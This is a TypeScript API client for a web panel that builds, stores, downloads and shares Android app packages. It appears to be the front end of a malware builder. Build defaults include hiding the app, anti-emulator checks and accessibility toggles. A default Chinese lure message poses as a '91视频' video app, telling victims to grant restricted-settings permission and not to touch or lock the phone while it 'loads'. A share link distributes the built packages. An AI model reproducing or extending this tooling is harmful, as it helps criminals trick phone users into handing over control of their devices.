import type {
  ApplicationBuildForm,
  ApplicationItem,
  ApplicationTemplate,
  LegacySession,
  LegacyWrapped,
} from '#/types/application';

import { apiError, http } from './http';
import { PROFILE_KEY, readProfile, TOKEN_KEY } from './mm';

const apiBase = import.meta.env.VITE_GLOB_API_URL || '/api';

function normalizedApiBase() {
  return apiBase.endsWith('/') ? apiBase.slice(0, -1) : apiBase;
}

function apiEndpoint(path: string) {
  const normalizedPath = path.startsWith('/') ? path : `/${path}`;
  return `${normalizedApiBase()}${normalizedPath}`;
}

function currentSession(): LegacySession {
  const profile = readProfile();
  const fallbackProfile = (() => {
    const raw = localStorage.getItem(PROFILE_KEY);
    if (!raw) return null;
    try {
      return JSON.parse(raw) as { email?: string };
    } catch {
      return null;
    }
  })();
  const token = localStorage.getItem(TOKEN_KEY) || '';
  const email = profile?.email || fallbackProfile?.email || '';
  if (!email || !token) {
    throw new Error('登录已过期，请重新登录');
  }
  return { email, token };
}

function withSession(body: Record<string, unknown>) {
  return { ...currentSession(), ...body };
}

function parseLegacyValue<T>(value: unknown): T {
  if (typeof value !== 'string') return value as T;
  try {
    return JSON.parse(value) as T;
  } catch {
    return value as T;
  }
}

export function parseLegacySuccess<T>(payload: LegacyWrapped<T>): T {
  if (payload.Success !== undefined)
    return parseLegacyValue<T>(payload.Success);
  if (payload.Req !== undefined) return parseLegacyValue<T>(payload.Req);
  if (payload.Fail !== undefined) {
    throw new Error(String(parseLegacyValue(payload.Fail)));
  }
  return payload.data as T;
}

function splitLegacyCsv(value: string) {
  if (!value) return [];
  return value
    .split(',')
    .map((item) => item.trim())
    .filter(Boolean);
}

function normalizeLegacyText(value: string | undefined, fallback: string) {
  const raw = value || fallback;
  return raw.replaceAll(/\r?\n/g, '   ');
}

export function legacyAssetUrl(path: string) {
  if (!path) return '';
  if (/^https?:\/\//.test(path)) return path;
  const base = normalizedApiBase();
  const clean = path.replaceAll('\\', '/').replaceAll(/^\/+/g, '');
  if (clean.startsWith('api/')) return `/${clean}`;
  if (clean.startsWith('user/')) return `${base}/${clean}`;
  if (clean.startsWith('ui/')) return `${base}/user/${clean}`;
  if (/^\d+\/icons\//.test(clean)) return `${base}/user/storage/${clean}`;
  return `${base}/${clean}`;
}

export function buildApplicationPayload(
  form: ApplicationBuildForm,
  session: LegacySession = currentSession(),
) {
  return {
    accsstyp: form.accsstyp || 'g',
    allprims: form.allprims || '1',
    appid: form.appid,
    appname: form.appname,
    appurl: form.appurl,
    appversion: form.appversion,
    blackprims: form.blackprims || '1',
    btype: form.btype || 'C',
    cname: form.cname,
    description: form.description || '无',
    diaotype: form.diaotype || '1',
    email: session.email,
    hidapp: form.hidapp || '1',
    hidtype: form.hidtype || 'f',
    icoid: form.icoid,
    logb: form.logb || '确定',
    logd: form.logd || '允许受限制的设置',
    loglng: normalizeLegacyText(
      form.loglng,
      '91视频温馨提醒   因大陆网络受限制本次需要开启权限才能使用   请仔细阅读使用步骤--   1、点击下方确定--   2、打开已下载服务（或应用）--   3、点击91视频--开始使用--等待加载100%即可使用',
    ),
    logt: form.logt || 'name',
    noemu: form.noemu || 'black',
    notmsg: form.notmsg || 'on',
    nottitle: form.nottitle || ' ',
    openaccess: form.openaccess || '0',
    subcom: 'build',
    token: session.token,
    uaccess: form.uaccess || '1',
    ukill: form.ukill || '1',
    uprims: form.uprims || '加载中~请勿操作或锁屏！',
    usedraw: form.usedraw || '0',
  };
}

export async function fetchApplications() {
  const res = await http
    .post<LegacyWrapped<ApplicationItem[]>>(
      '/private/inventory_api.php',
      withSession({ subcom: 'load' }),
    )
    .then((r) => r.data);
  if (res.Req !== undefined) return [];
  return parseLegacySuccess<ApplicationItem[]>(res) || [];
}

export async function deleteApplication(appid: string) {
  const res = await http
    .post<LegacyWrapped<string>>(
      '/private/inventory_api.php',
      withSession({ appid, subcom: 'delete' }),
    )
    .then((r) => r.data);
  return parseLegacySuccess<string>(res);
}

export async function fetchApplicationTemplates() {
  const res = await http
    .post<LegacyWrapped<ApplicationTemplate[]>>(
      '/private/build_api.php',
      withSession({ subcom: 'load' }),
    )
    .then((r) => r.data);
  return parseLegacySuccess<ApplicationTemplate[]>(res) || [];
}

export async function buildApplication(form: ApplicationBuildForm) {
  const res = await http
    .post<LegacyWrapped<string>>(
      '/private/build_api.php',
      buildApplicationPayload(form),
    )
    .then((r) => r.data);
  return parseLegacySuccess<string>(res);
}

async function profileRequest(
  type: string,
  extra: Record<string, string> = {},
  file?: File,
) {
  const session = currentSession();
  const body = new FormData();
  body.set('email', session.email);
  body.set('token', session.token);
  body.set('type', type);
  for (const [key, value] of Object.entries(extra)) body.set(key, value);
  if (file) body.set('file', file);

  const response = await fetch(apiEndpoint('/private/profile_api.php'), {
    body,
    headers: {
      Authorization: `Bearer ${session.token}`,
      'X-Auth-Token': session.token,
    },
    method: 'POST',
  });
  const payload = await response.json().catch(() => ({}));
  if (!response.ok)
    throw new Error(apiError(payload, `HTTP ${response.status}`));
  return payload as LegacyWrapped<string>;
}

export async function listApplicationIcons() {
  const res = await profileRequest('listico');
  return splitLegacyCsv(parseLegacySuccess<string>(res));
}

export async function listUiImages() {
  const res = await profileRequest('listui');
  return splitLegacyCsv(parseLegacySuccess<string>(res));
}

export async function uploadApplicationIcon(file: File) {
  return parseLegacySuccess<string>(await profileRequest('ico', {}, file));
}

export async function uploadUiImage(file: File) {
  return parseLegacySuccess<string>(await profileRequest('ui', {}, file));
}

export async function removeApplicationIcon(iconPath: string) {
  const iconame = iconPath.split('/').findLast(Boolean) || iconPath;
  return parseLegacySuccess<string>(
    await profileRequest('remico', { iconame }),
  );
}

export async function removeUiImage(uiPath: string) {
  const uiname = uiPath.split('/').findLast(Boolean) || uiPath;
  return parseLegacySuccess<string>(await profileRequest('remui', { uiname }));
}

export async function downloadApplication(
  appid: string,
  onProgress?: (progress: number) => void,
) {
  const session = currentSession();
  const response = await fetch(apiEndpoint('/private/inventory_api.php'), {
    body: JSON.stringify({ ...session, appid, subcom: 'download' }),
    headers: {
      Accept: 'application/octet-stream, application/json',
      'Content-Type': 'application/json',
      Authorization: `Bearer ${session.token}`,
      'X-Auth-Token': session.token,
    },
    method: 'POST',
  });
  const contentType = response.headers.get('content-type') || '';
  if (contentType.includes('application/json')) {
    const payload = (await response.json()) as LegacyWrapped<string>;
    throw new Error(parseLegacySuccess<string>(payload));
  }
  if (!response.ok) throw new Error(`HTTP ${response.status}`);
  const blob = await response.blob();
  onProgress?.(100);
  return blob;
}

export function applicationShareUrl(appid: string) {
  const path = apiEndpoint(`/download.php?pkg=${encodeURIComponent(appid)}`);
  if (/^https?:\/\//.test(path)) return path;
  return `${window.location.origin}${path}`;
}
